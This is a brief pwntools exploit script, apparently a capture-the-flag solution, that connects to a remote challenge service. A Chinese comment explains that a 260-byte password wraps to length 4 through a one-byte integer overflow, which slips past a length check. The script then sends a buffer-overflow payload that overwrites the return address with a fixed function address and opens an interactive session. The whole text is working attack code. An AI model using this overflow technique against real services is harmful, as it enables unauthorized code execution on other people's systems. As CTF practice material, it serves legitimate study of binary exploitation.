from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/51ed19eacdea43e3bd67217d08eb8a0e')
p = remote('61.147.171.105', '64230')

input('continue?')

# 整数溢出利用，我们传入的字符串长度为260，转换为单个字节后只保留低位，因此260变为4，符合长度要求
payload = b'a'* 24 + p32(0x0804868b) + b'a' * (260 - 28)

p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'username:\n', b'test')
p.sendlineafter(b'passwd:\n', payload)

p.interactive()